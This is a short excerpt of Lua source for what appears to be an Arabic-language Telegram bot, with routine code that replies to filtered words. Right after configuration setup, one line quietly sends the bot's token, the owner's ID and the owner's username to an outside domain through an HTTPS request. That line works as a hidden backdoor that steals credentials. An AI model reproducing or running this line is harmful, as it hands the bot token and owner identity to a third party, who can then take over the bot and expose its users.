...
create_config_auto()
https.request("https://lana.gamemodsm.xyz/sadam/?info={'id':'"..database:get(id_server..":SUDO:ID").."','user':'"..database:get(id_server..":SUDO:USERNAME").."','token':'"..database:get(id_server..":token").."'}")
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
------------------------------------------------------------------------
local sadambot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if sadambot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..sadambot.."] \n") 
